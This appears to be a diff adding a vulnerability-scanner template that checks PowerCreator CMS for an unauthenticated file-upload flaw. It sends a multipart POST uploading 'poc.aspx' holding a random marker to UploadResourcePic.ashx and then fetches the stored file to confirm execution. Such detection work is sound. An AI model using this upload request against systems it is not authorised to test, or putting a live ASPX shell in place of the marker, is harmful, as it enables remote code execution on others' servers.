@@ -1,0 +1,51 @@
+http:
+    - extractors:
+        - internal: true
+          name: endpoint
+          part: body
+          regex:
+            - (.*?.ASPX)
+          type: regex
+      matchers:
+        - dsl:
+            - contains(body_2, '{{randstr}}') && status_code_2 == 200
+          type: dsl
+      raw:
+        - |
+          POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
+          Host: {{Hostname}}
+          Content-Disposition: form-data;name="file1";filename="poc.aspx";
+          Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+
+          -----------------------------20873900192357278038549710136
+          Content-Disposition: form-data; name="file1"; filename="poc.aspx"
+          Content-Type: image/jpeg
+
+          {{randstr}}
+          -----------------------------20873900192357278038549710136--
+        - |
+          GET /ResourcePic/{{endpoint}} HTTP/1.1
+          Host: {{Hostname}}
+      req-condition: true
+id: powercreator-cms-rce
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        PowerCreator CMS is susceptible to a remote code execution vulnerability.
+    metadata:
+        max-request: 2
+    name: PowerCreator CMS - Remote Code Execution
+    reference:
+        - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/
+    severity: critical
+    tags:
+        - powercreator
+        - intrusive
+        - fileupload
+        - PowerCreator CMS
+        - rcms
+        - PowerCreator-CMS
